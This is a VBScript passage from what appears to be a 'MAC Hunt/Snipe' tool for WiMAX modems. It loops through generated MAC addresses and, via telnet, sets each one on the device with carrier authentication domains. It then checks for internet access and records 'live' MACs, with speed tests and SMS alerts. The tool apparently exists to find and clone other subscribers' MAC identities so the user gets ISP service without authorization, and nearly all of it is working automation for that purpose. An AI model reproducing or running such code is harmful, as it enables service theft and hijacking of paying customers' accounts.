ansBtn = objShellInGen.Popup("WARNING : Before you continue."& vbCr & vbLf & vbCr & vbLf & "MAC HUNT/SNIPE : Are you sure? "& vbCr & vbLf & vbCr & vbLf & "NOTE: You can modify following:" & vbCr & vbLf &  " - NAI (can be excluded)"  & vbCr & vbLf &  " - DOMAIN"& vbCr & vbLf  & vbCr & vbLf &"[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Warning message...", 1 + 4096 + 48)
If (ansBtn = -1 OR ansBtn = 1)  Then
DisplayLogMacGenScan("Operation started...")
Else 
DisplayLogMacGenScan("Operation Cancelled...")
Exit Sub
End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
End if
hdnStopMacProcess.value = "0"  
hdnStopProcessResult.value = "0"
If EnableDisableSnipButton Then
MsgBox "Please generate MAC first"
Exit Sub
End If
ClearTstCmndInOut 
''If Ping(Trim(inputTelnetHost.value)) Then
DisplayLogMacGenScan("Checking  " & inputTelnetHost.value & " Please WAIT....")
If PingHostLoop Then
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
Set fso = CreateObject("Scripting.FileSystemObject")
liveMacFound = 0
StartDate = Now
Do 
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Do
End If
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set listMacFile = fso.OpenTextFile(textFilePath,1)
macToTestLine =  listMacFile.ReadLine()
Sleeper 500
MyString = (Trim(macToTestLine))
MyArray = Split(MyString, "|", -1, 1)
macToTest = Trim(MyArray(0))
macToTestDomainOld = MyArray(1)
''
DomainWithPass = (Trim(macToTestDomainOld))
ArrayGetDomPass = Split(DomainWithPass, ",", -1, 1)
macDomainPass = Trim(ArrayGetDomPass(2))
macToTestDomain = ArrayGetDomPass(0) & "," & ArrayGetDomPass(1)
''
mactoDelete = macToTest & "|" & macToTestDomainOld

LogContents.value = "START testing of " & macToTest & " on " & inputTelnetHost.value 
DisplayLogMacGenScan("========================================================")
Sleeper 1000
ConnectToTSTSnipe(macToTest)
Sleeper 1000
DisplayLogMacGenScan("Checking telnet log...")
tstLogCmnd =  "TelnetOutPutCmnd.txt"
Sleeper 1000
''True
If CheckTstLogFile (tstLogCmnd) = True Then	
''Sleeper 25000 ''35000
''
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: Log ok...")
Sleeper 1000 ''35000
Else
DisplayLogMacGenScan( "Log ok..." & vbCr & vbLf & "Device is Rebooting..." & vbCr & vbLf & "Waiting for the device...." )
Sleeper 25000 ''35000
End If
''
liveCountHost = 0
telnetHostLive = False
Do 
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
telnetHostLive = True 
Exit Do
End if 
Sleeper 3000
DisplayLogMacGenScan( "Waiting for the device is finish...." & vbCr & vbLf & "Trying to connect after reboot...")
telnetHostLive = Ping(Trim(inputTelnetHost.value))
'telnetHostLive = Ping("192.168.2.1")
If	telnetHostLive = False Then
liveCountHost = liveCountHost + 1
DisplayLogMacGenScan("Check try (" &liveCountHost & " of 15).")
Else
Exit Do
End If
If liveCountHost =2  Or liveCountHost =8  Or liveCountHost =13 Then
'MsgBox "Error on interface connecting not Updating"
DisplayLogMacGenScan("Retrying to connect...")
'CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
'Sleeper 5000
'CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
''
If radiobtnBm622m2012.checked Then
DisableEnableLANSixToToM
Sleeper 5000
Else
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 5000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
End If
''
End If
If	liveCountHost >=15  Then
''telnetHostLive = True 
telnetHostLive = False 
'MsgBox telnetHostLive
End If
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
Loop While telnetHostLive = False
listMacFile.Close
''If liveCountHost >= 16 Then
If telnetHostLive = False Then
DisplayLogMacGenScan("Connection Failed...." & vbCr & vbLf & "Process aborted....")
DisplayLogMacGenScan("WIMAX Device is NOT yet connected...")
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
MsgBox "WIMAX Device is NOT yet connected... process aborted.",16,"Connection Status"									
Exit Sub
Else 
liveCountHost = 0
changeSecurityOnlySnipeResult = 0
'MsgBox "Connected"
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: Telnet Check finished....")
Else
DisplayLogMacGenScan("Connection success!!! Ok....")
Sleeper 1000
End If
If SnipeMacRadioOption = "REBOOT" Then
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
''end if stop
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: Configuring device is now starting....")
Else
DisplayLogMacGenScan("Changing Security Setings....")
End If
''BEGIN DomainTEst
''BEGIN ORIGdomaintest
'changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macToTestDomain)
'If changeSecurityOnlySnipeResult = 1 Then
'liveMacFound = liveMacFound + 1
'macLiveCount.innerhtml = liveMacFound
'End if
'changeSecurityOnlySnipeResult = 0
'Sleeper 2000 
''END ORIGdomaintest
If macToTestDomain = "ALL,TTLS" Then
domainList = ReadDropDomainlistCmnd ''ReadDropDomainlistCmndTLS
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1 & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if

If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
ElseIf macToTestDomain = "ALL,TLS" Then
domainListTLS = ReadDropDomainlistCmndTLS
MyString = (Trim(domainListTLS))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1 & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if

If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
ElseIf 	macToTestDomain = "combiGH,TTLS" Then
domainList = "@globelines.com.ph,TTLS|@huawei.com,TTLS"
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1 & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if

If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
ElseIf 	macToTestDomain = "combiGGT,TTLS" Then
domainList = "@globelines.com.ph,TTLS|@globetel.com.ph,TTLS"
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1  & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if


If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
ElseIf 	macToTestDomain = "combiGG,TTLS,TLS" Then
domainList = "@globelines.com.ph,TTLS|@globelines.com.ph,TLS"
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1  & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if


If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
ElseIf 	macToTestDomain = "combiGTGT,TTLS,TLS" Then
domainList = "@globetel.com.ph,TTLS|@globetel.com.ph,TLS"
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1  & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if


If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
ElseIf 	macToTestDomain = "combiHH,TTLS,TLS" Then
domainList = "@huawei.com,TTLS|@huawei.com,TLS"
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1  & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if


If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
ElseIf 	macToTestDomain = "combiGTH,TTLS" Then
domainList = "@globetel.com.ph,TTLS|@huawei.com,TTLS"
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan "Current DOMAIN list to use(" & MyArrayLength + 1  & "):" 
DisplayLogMacGenScan domainList 

For i = 0 To MyArrayLength
changeSecurityOnlySnipeResult = 0
macDomainToUse = MyArray(i)& "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: This OPTION is not available for SMART user!!!")
changeSecurityOnlySnipeResult = -1
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound

changeSecurityOnlySnipeResult = 0
Sleeper 3000 
If chkDonotTestAll.Checked Then
Exit For
End If 
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
changeSecurityOnlySnipeResult = 0
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if


If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit For
End If
Next
''
Else
macDomainToUse = macToTestDomain & "," & macDomainPass
DisplayLogMacGenScan "Now testing...." & macDomainToUse
If radiobtnBm622m2012.checked Then
changeSecurityOnlySnipeResult = ChangeSecuritySnipeSixToToM (macToTest,macDomainToUse)
ElseIf radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipeDv235t (macToTest,macDomainToUse)
Else
changeSecurityOnlySnipeResult = ChangeSecurityOnlySnipe (macToTest,macDomainToUse)
End If
If changeSecurityOnlySnipeResult = 1 Then

liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound
ElseIf changeSecurityOnlySnipeResult = -1 Then
hdnStopMacProcess.value = "1"
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit Sub
End if

changeSecurityOnlySnipeResult = 0
Sleeper 2000 
End If
''End DomainTEst
Else 
If hdnStopMacProcess.value = "1" Then
Sleeper 1000 
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
''ping google.com test if connected
''liveCount = 0
macIsLive = "Dead"
'hostToPing = "127.0.0.1"
'hostToPing = "192.168.22.1"
''hostToPing = "www.google.com"
''DisplayLogMacGenScan("Checking internet connection....")
DisplayLogMacGenScan("Testing internet connection....")
DisplayLogMacGenScan("PLEASE WAIT while the TESTING is not finish.... Number of tries is: " & snipeTryList.value)
DisplayLogMacGenScan("DO NOT CLOSE the TOOL in this process. Use STOP to cancel process!!!")
Sleeper 10000
''
''If (liveCount > 0) Then
''begin check internet
If CheckInternetSnipe Then
'' end check internet
''appendLiveMacToFile macToTest,macToTestDomain
defaultMacDomain = "@globelines.com.ph"
appendLiveMacToFile macToTest,defaultMacDomain
Sleeper 2000
macIsLive = "Alive"
liveMacFound = liveMacFound + 1
macLiveCount.innerhtml = liveMacFound
''
If chkEnableSmsSnipe.Checked Then
DisplayLogMacGenScan "SMS/Text Notifier is enabled. Trying to send info.Please Wait......"
msgToSend = Mid(macToTest,1,8) & " series is ALIVE!!"
numberTosend = Trim(inputPhone.value)
numberPrefix = liveIPTryList.value
If  numberTosend  <> "1234567" Then
If SendTextSMS(numberPrefix,numberTosend,msgToSend) Then
DisplayLogMacGenScan "Live MAC found SENT.... to " &numberPrefix & numberTosend
Else 
DisplayLogMacGenScan "Failed to Send SMS/text... to " &numberPrefix & numberTosend
End If
Else 
DisplayLogMacGenScan "You did not specifiy the phone number..."
End If
End If 
''
End If
DisplayLogMacGenScan(macToTest & " is " & macIsLive & "!!!...." )
Sleeper 3000
''
End If
appendDeadMacToFile(mactoDelete)
Sleeper 1000
deleteMacFromGenFile(mactoDelete)
previousTestedMAC.value = macToTest
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set listMacFile = fso.OpenTextFile(textFilePath,1)
End If 
Else 
DisplayLogMacGenScan("ERROR: on TELNET access / changing MAC Address...."  & vbCr & vbLf & "Process aborted.... Please check your CONNECTION / MAC." & vbCr & vbLf & "Live MAC found: " & liveMacFound)
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogMacGenScan "Please Check TelnetOutPutCmnd.txt and TelnetInputCmnd.txt. And REPORT it to the author. THANK YOU!"
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
MsgBox "ERROR: on TELNET accesss / Changing MAC address. Please check your CONNECTION / MAC. ",16+4096,"Notification message"
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
Exit sub
End If
If hdnStopMacProcess.value = "1" Then
hdnStopProcessResult.value = "1"
Sleeper 1000
DisplayLogMacGenScan("Stopping process....Ok!")
listMacFile.Close
secElapseTime= DateDiff("s", StartDate, Now)
If secElapseTime > 60 Then
FinalElapseTimeMin = Round((secElapseTime /60),2)'DateDiff("m", StartDate, Now)
DisplayLogMacGenScan( "" & vbCr & vbLf& "MAC testing was FINISHED...." & "Live MAC found: " & liveMacFound & " Elapse Time: " & FinalElapseTimeMin &" min(s)")
Else
FinalElapseTimeSec = secElapseTime
DisplayLogMacGenScan( "" & s& "MAC testing was FINISHED...." & "Live MAC found: " & liveMacFound & " Elapse Time: " & FinalElapseTimeSec &" sec(s)")
End If
Exit Sub
End If
DisplayLogMacGenScan( "FINISHED test on " & macToTest & "...")
DisplayLogMacGenScan("Use STOP to CANCEL the MAC Snipe!!!")
DisplayLogMacGenScan("========================================================")
Sleeper 2000
Loop while not listMacFile.AtEndOfStream 
listMacFile.Close
secElapseTime= DateDiff("s", StartDate, Now)
If secElapseTime > 60 Then
FinalElapseTimeMin = Round((secElapseTime /60),2)'DateDiff("m", StartDate, Now)
DisplayLogMacGenScan( "" & vbCr & vbLf& "MAC testing was FINISHED...." & "Live MAC found: " & liveMacFound & " Elapse Time: " & FinalElapseTimeMin &" min(s)")
Else
FinalElapseTimeSec = secElapseTime
DisplayLogMacGenScan( "" & s& "MAC testing was FINISHED...." & "Live MAC found: " & liveMacFound & " Elapse Time: " & FinalElapseTimeSec &" sec(s)")
End If
hdnStopProcessResult.value = "1"
If chkEnableRestoreDefalutMac.Checked Then
RestoreDefaultMac
Else
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
End If
Else 
DisplayLogMacGenScan ("Process aborted.... Please check your CONNECTION if you're already connected to WIMAX device.")
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
''Begin Shutdown PC?'
If chkShutDownSnipe.Checked Then
ShutdownPC
End if
''End of Shutdown PC?
Exit Sub
End If
Set fso = Nothing
Set listMacFile= Nothing
End Sub
'Sub appendLiveMacToFile(macTested,macDomain)
'	Dim textFilePath,objFSO,objTextFile
'	const ForAppending = 8
'	textFilePath = "LiveMac.txt"
'	set objFSO = createobject("Scripting.FileSystemObject")
'		If (objFSO.FileExists(textFilePath)) Then
'			set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
'			objTextFile.WriteLine(macTested &"|"& macDomain)
'			objTextFile.Close
'		Else
'			set objTextFile = objFSO.CreateTextFile(textFilePath)
'			objTextFile.WriteLine(macTested &"|"& macDomain)
'			objTextFile.Close
'		End If
'	Set objFSO = Nothing
'	Set textFilePath = Nothing
'	Set objTextFile = Nothing
'End Sub
Sub appendLiveMacToFile(macTested,macDomain)
Dim textFilePath,objFSO,objTextFile
const ForAppending = 8
''textFilePath = "LiveMac.txt"
filename = "LiveMac.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
idMac = GenNumberId
DisplayLogMacGenScan "PLEASE change download TEST FILE size in TOOL SETTINGS TAB menu."
DisplayLogMacGenScan "Please DO NOT EXIT!!! (CURRENT TEST file size is: " & fileSizeList.value &")"  & vbCr & vbLf &"Please WAIT this MAY TAKE FOR A WHILE to finished....."
DisplayLogMacGenScan "SPEED TEST is now processing........... Please WAIT!!!"
Sleeper 1000
speedResult = DownLoadSpeedResult
DisplayLogMacGenScan "Average SPEED test result: " & speedResult
macStringFind = macTested &"|"& macDomain & "|"
If MacIsInTheList(textFilePath,macStringFind) = False Then
set objFSO = createobject("Scripting.FileSystemObject")
If (objFSO.FileExists(textFilePath)) Then
set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
objTextFile.WriteLine(macTested &"|"& macDomain & "|"& idMac & "|"& speedResult )
objTextFile.Close
Else
set objTextFile = objFSO.CreateTextFile(textFilePath)
objTextFile.WriteLine(macTested &"|"& macDomain & "|"& idMac & "|"& speedResult)
objTextFile.Close
End If
Else
DisplayLogMacGenScan "APPEND MAC FAILED: " & macTested & macDomain & " is already in the LIVE MAC List....."
End If
populateListOfLiveMac
idMac = 0
Set objFSO = Nothing
Set textFilePath = Nothing
Set objTextFile = Nothing
End Sub
Sub openLiveMacFile()
Dim textFilePath,objFSO,objShell
''textFilePath = "LiveMac.txt"
filename = "LiveMac.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
set objFSO = createobject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell") 
If (objFSO.FileExists(textFilePath)) Then
MsgBox "MAC Hunting was finished Press [OK] to load the file.",48,"Hunt Status " & macScanCheck(checScanTest)
ShellRun = objShell.Run ("%comspec% /c Start Notepad " &Chr(34) & textFilePath & chr(34) , 0, 1)
Else
MsgBox "Sorry NO Live MACS Found... Or try to open LiveMacs.txt"
End If
Set objFSO = Nothing
Set textFilePath = Nothing
Set objShell = Nothing
End Sub
Sub testX
Set UAC = CreateObject("Shell.Application")
End Sub
''Begin NEW DOWNLOADspeedTest
''Begin ClearDLresultFile
Sub ClearDLresultFile
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = "DLresult.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If (objFSO.FileExists(textFilePath)) Then 
Set objOutputFile = objFSO.OpenTextFile(textFilePath, ForWriting)
objOutputFile.Close
Else
''MsgBox "Dl result file is empty."
End If
End Sub 
''end ClearDLresultFile
''
Function updateCheckFinalFile (tstLogCmndFileText)		
Dim fso
filenameLogFile = tstLogCmndFileText
tstLogCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameLogFile)
Set fso = CreateObject("Scripting.FileSystemObject")
isOk = False
If fso.FileExists(tstLogCmndFile)= True Then
If fso.GetFile(tstLogCmndFile).size <> 0 then
isOk = True
Else
'MsgBox "File is EMPTY!"
isOk = False
End if
Else
'MsgBox "File NOT EXIST"
isOk = False
End If
updateCheckFinalFile = isOk
Set fso = Nothing
End Function
''
